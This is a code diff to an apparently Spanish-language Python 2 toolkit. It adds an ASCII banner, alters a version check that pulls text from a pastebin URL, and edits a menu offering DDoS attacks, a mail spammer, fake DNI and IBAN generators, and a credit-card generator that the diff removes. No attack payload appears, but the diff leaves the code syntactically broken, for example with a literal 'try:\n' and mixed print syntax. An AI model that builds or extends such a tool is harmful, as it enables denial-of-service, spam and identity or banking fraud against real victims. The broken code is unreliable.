@@ -9,7 +9,7 @@ vrs = ' Windows Edition'
 
 time.sleep(0.5)
 import os
-try:
+try:\n
  import requests
 except:
   print" Installing requests Module"
@@ -21,22 +21,35 @@ except:
       raw_input('')
   else:
     os.system('pip2 install requests')
-msg00 ="##### GOOd Now You have all modules #####";"############## Let's start ##############"
+msg001 = """
+                                     _       
+                                    | |      
+  ___ __ _ _ __ __ _  __ _ _ __   __| | ___  
+ / __/ _` | '__/ _` |/ _` | '_ \ / _` |/ _ \ 
+| (_| (_| | | | (_| | (_| | | | | (_| | (_) |
+ \___\__,_|_|  \__, |\__,_|_| |_|\__,_|\___/ 
+                __/ |                        
+               |___/                         
+"""
+print(msg001)
+msg00 = "OOO\n"
 for i in msg00:
         sys.stdout.write(i)
         sys.stdout.flush()
-        time.sleep(0.02)
+        time.sleep(2)
 
 vers=requests.get('https://pastebin.com/raw/0pqX38U3').text.encode('utf-8')
 
 #potasio=requests.get('https://pastebin.com/raw/UyhX5Pjt').text.encode('utf-8')
+"""
 ms0g ="Checking Your Version (%s) "%vers
 for i in ms0g:
         sys.stdout.write(i)
         sys.stdout.flush()
         time.sleep(0.02)
-if vers=="3.5":
-  print('{>} Good You have last version \n')
+"""
+if vers=="3.6":
+    pass
 else:
  print("There is New Version available !! Do you Want To Update Your tool ? ")
  ok=raw_input('''
@@ -93,12 +106,11 @@ while True:
     print("   2.GENERADOR DE DNI")
     print("   3.ATAQUE DDOS(LVL 3)")
     print("   4.IBAN GEN/CHECK")
-    print("   5.OTRAS HERRMIENTAS[ALPHA]")
+    print("   5.OTRAS HERRMAIENTAS[ALPHA]")
     print("   6.WEB CLEANER")
     print("   7.MAIL SPAMMER")
     print("   8.HOST TO IP")
     print("   9.STEAD - DDOS (LVL 4)")
-    print("   10.CCGEN")
     print("   99.Salir")
     print("")
     opc = input("  Digite el numero de la opcion: ")
